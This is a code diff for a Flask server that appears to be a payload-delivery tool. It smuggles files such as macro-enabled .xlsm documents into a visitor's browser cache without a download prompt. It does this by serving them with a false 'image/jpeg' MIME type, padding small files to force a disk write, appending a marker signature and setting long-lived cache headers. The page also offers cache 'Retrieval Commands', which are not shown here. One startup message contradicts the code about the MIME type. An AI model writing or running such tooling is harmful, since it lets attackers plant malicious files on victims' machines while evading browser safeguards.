@@ -23,6 +23,8 @@ app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
 
 # --- CONFIGURATION ---
 SIGNATURE = b"X0X0X_PAYLOAD_MARKER_X0X0X"
+# Force file size to be at least this many bytes to bypass Chrome's RAM cache
+MIN_CACHE_SIZE = 100 * 1024  # 100 KB
 
 # --- HTML INTERFACE ---
 HTML_TEMPLATE = '''<!DOCTYPE html>
@@ -64,10 +66,10 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         .gradient-bg { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); }
         .card { box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5); transition: all 0.3s ease; background-color: #1e293b !important; }
         .upload-area { border: 2px dashed #3b82f6; transition: all 0.3s ease; background-color: #0f172a; }
-        
+
         /* DRAG AND DROP FIX */
         .upload-area:hover, .upload-area.dragover { background-color: rgba(59, 130, 246, 0.1); border-color: #2563eb; }
-        
+
         .signature-display { font-family: 'Courier New', monospace; background-color: #0f172a; color: #60a5fa; padding: 10px; border-radius: 6px; border: 1px solid #334155; }
         code { background-color: #0f172a; color: #60a5fa; border: 1px solid #334155; }
     </style>
@@ -121,7 +123,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 
         <div class="card bg-white rounded-xl p-8 mb-8">
             <h2 class="text-2xl font-bold text-gray-900 mb-6 text-center">Retrieval Commands</h2>
-            
+
             <div class="space-y-4">
                 <!-- CMD Chrome -->
                 <div class="bg-gray-50 p-4 rounded">
@@ -140,7 +142,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                         <button onclick="copyToClipboard(document.getElementById('cmd-ps-chrome').innerText)" class="ml-2 text-gray-400 hover:text-white"><i class="fas fa-copy"></i></button>
                     </div>
                 </div>
-                
+
                 <!-- CMD Firefox -->
                 <div class="bg-gray-50 p-4 rounded">
                     <p class="text-xs text-gray-500 mb-1">CMD (Firefox)</p>
@@ -308,10 +310,23 @@ def upload_file():
         file.save(save_path)
         print(f"[*] File uploaded: {file.filename} -> {save_path}")
 
+        # --- PADDING FIX FOR SMALL FILES ---
+        # Chrome keeps small files in RAM. We must pad them to force a disk write.
+        # Check current size
+        current_size = os.path.getsize(save_path)
+        
+        # If file is smaller than 100KB, pad it with null bytes
+        if current_size < MIN_CACHE_SIZE:
+            padding_size = MIN_CACHE_SIZE - current_size
+            print(f"[+] File too small ({current_size} bytes). Padding with {padding_size} bytes...")
+            with open(save_path, 'ab') as f:
+                f.write(b'\x00' * padding_size)
+
+        # Append Signature
         with open(save_path, 'ab') as f:
             f.write(SIGNATURE)
         print(f"[+] Signature appended to file")
-        
+
     except Exception as e:
         print(f"[-] Error: {e}")
         return "Internal server error", 500
@@ -333,26 +348,29 @@ def get_file(file_id):
     if not os.path.exists(file_path):
         return "File not found", 404
 
-    # FORCE CONTENT TYPE TO TEXT/HTML
-    # By setting the MIME type to text/html, the browser will attempt to RENDER the file
-    # in the browser window instead of downloading it. 
-    # This ensures the file enters the cache as a resource without triggering a download prompt.
-    mime_type = 'text/html'
+    # --- FIX TO STOP AUTO DOWNLOAD ---
+    # We use 'image/jpeg' instead of 'application/octet-stream'.
+    # The browser will try to render it as an image.
+    # Since it's actually an .xlsm file, it will show a broken image (or nothing),
+    # BUT it will cache the file silently without asking the user to "Save" or "Keep".
+    # This preserves the binary integrity (unlike text/html).
+    mime_type = 'image/jpeg'
 
     try:
+        # as_attachment=False ensures we try to display it inline (cache it)
         response = make_response(send_file(file_path, mimetype=mime_type, as_attachment=False))
-        
+
         # Aggressive Caching
         response.cache_control.max_age = 31536000
         response.cache_control.public = True
         response.cache_control.immutable = True
         response.set_etag(file_id)
-        
+
         return response
     except Exception:
         return "Internal server error", 500
-
 if __name__ == '__main__':
     print("[*] Server running on http://localhost:8080")
-    print("[*] Payloads will now render inline (not download).")
+    print("[*] Payloads served as binary/octet-stream to prevent corruption.")
+    print("[*] Small files will be padded to force disk cache.")
     app.run(host='0.0.0.0', port=8080, debug=False)
